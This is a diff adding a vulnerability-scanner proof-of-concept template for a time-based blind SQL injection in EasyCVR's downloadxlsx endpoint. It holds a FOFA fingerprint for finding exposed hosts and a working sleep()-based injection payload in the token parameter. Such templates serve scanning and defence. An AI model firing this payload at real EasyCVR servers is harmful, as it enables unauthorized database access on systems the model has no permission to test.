@@ -1,0 +1,19 @@
+id: poc-yaml-easy-cvr-downloadxlsx-sqli
+info:
+  name: EasyCVR视频管理平台 downloadxlsx SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: EasyCVR
+  fofa: title="EasyCVR"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: GET
+  path: /api/v1/cascade/downloadxlsx?token=%27and(select*from(select/**/sleep({{.t1}}))a/**/union/**/select+1)=%27
+  expression: status_code == 200 && ( contains(body,".xlsx") || contains(content_type,"application/octet-stream")
+    || contains(content_type,"application/zip") || contains(content_type,"application/json")
+    || contains(content_type,"text/html") ) && ( contains(body,"\"Unauthorized\"")
+    || contains(body,"sheet2") ) && ( duration > t1 && duration < t2 )
+transport: http
